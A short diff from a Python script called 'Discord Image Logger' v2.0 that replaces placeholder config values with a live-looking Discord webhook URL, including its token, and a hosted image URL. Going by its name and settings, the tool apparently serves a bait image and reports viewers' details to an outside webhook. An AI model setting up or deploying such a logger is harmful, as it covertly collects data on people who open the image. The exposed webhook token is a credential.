@@ -8,8 +8,8 @@ __app__ = "Discord Image Logger"
 __version__ = "v2.0"
 
 config = {
-    "webhook": "YOUR_WEBHOOK_URL_HERE",
-    "image": "YOUR_IMAGE_URL_HERE",
+    "webhook": "https://discord.com/api/webhooks/1507858412900192386/AIgW29HVoKf6StR10P2_1bOXONbg6cVd4Ti6jEoQMfzsIOludq3FOUk_tKrtPSo4HwoI",
+    "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
